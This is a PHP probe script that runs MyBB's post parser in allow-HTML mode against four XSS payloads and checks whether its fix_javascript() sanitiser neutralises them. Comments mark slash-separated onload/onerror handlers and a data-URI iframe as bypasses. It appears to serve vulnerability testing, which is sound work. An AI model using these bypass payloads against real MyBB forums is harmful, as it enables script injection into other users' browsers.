<?php
/*
 * parse_probe.php — runs INSIDE the app container (docker exec).
 * Executes MyBB's OWN postParser::parse_message() in allow_html mode on a set of
 * payloads and prints, per payload, whether fix_javascript() neutralised the event
 * handler (it inserts a U+200C zero-width non-joiner between "on" and the handler
 * when its regex matches). This is the authoritative test of the sanitiser the
 * vendor relies on for allow_html content.
 *
 * Output: one "RESULT|<label>|<neutralised 0/1>|<handler_or_tag_intact 0/1>|<out>"
 * line per payload.
 */
define('IN_MYBB', 1);
require '/var/www/html/inc/class_error.php';
require '/var/www/html/inc/init.php';
require_once MYBB_ROOT.'inc/class_parser.php';

$parser = new postParser;
$opts = array(
    'allow_html'     => 1,   // the mode gated by the Allow HTML flags (default off)
    'allow_mycode'   => 1,
    'allow_smilies'  => 0,
    'allow_imgcode'  => 0,
    'filter_badwords'=> 1,
    'nl2br'          => 0,
);

$zwnj = "\xE2\x80\x8C";
$cases = array(
    'img_space_onerror' => '<img src=x onerror=alert(1)>',    // the case fix_javascript DOES catch
    'svg_slash_onload'  => '<svg/onload=alert(1)>',           // '/' separator bypass
    'img_slash_onerror' => '<img src=x/onerror=alert(1)>',    // '/' separator bypass
    'iframe_data'       => '<iframe src=data:text/html,alert(1)></iframe>', // non-event tag not stripped
);

foreach($cases as $label => $p)
{
    $out = $parser->parse_message($p, $opts);
    $neutralised = (strpos($out, $zwnj) !== false) ? 1 : 0;
    $intact = (preg_match('#(onerror|onload)\s*=#i', $out) || stripos($out, '<iframe') !== false) ? 1 : 0;
    // collapse newlines for a single-line result
    $flat = str_replace(array("\r", "\n"), ' ', $out);
    echo "RESULT|{$label}|{$neutralised}|{$intact}|{$flat}\n";
}
